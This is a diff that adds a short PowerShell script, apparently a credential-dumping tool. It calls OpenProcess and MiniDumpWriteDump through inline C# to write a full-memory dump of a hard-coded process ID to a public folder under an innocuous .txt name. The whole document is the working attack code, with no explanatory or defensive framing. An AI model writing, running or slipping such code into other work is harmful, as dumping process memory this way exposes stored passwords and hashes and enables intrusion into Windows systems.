@@ -1,0 +1,47 @@
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class MiniDump {
+        [DllImport("Dbghelp.dll", SetLastError=true)]
+        public static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+    }
+"@
+
+$PROCESS_QUERY_INFORMATION = 0x0400
+$PROCESS_VM_READ = 0x0010
+$MiniDumpWithFullMemory = 0x00000002
+
+Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class Kernel32 {
+        [DllImport("kernel32.dll", SetLastError=true)]
+        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [DllImport("kernel32.dll", SetLastError=true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+"@
+
+$processId ="788"
+
+$processHandle = [Kernel32]::OpenProcess($PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ, $false, $processId)
+
+if ($processHandle -ne [IntPtr]::Zero) {
+    $dumpFile = [System.IO.File]::Create("C:\users\public\test1234.txt")
+    $fileHandle = $dumpFile.SafeFileHandle.DangerousGetHandle()
+
+    $result = [MiniDump]::MiniDumpWriteDump($processHandle, $processId, $fileHandle, $MiniDumpWithFullMemory, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+
+    if ($result) {
+        Write-Host "Sucess"
+    } else {
+        Write-Host "Failed" -ForegroundColor Red
+    }
+
+    $dumpFile.Close()
+    [Kernel32]::CloseHandle($processHandle)
+} else {
+    Write-Host "Failed to open process handle." -ForegroundColor Red
+}
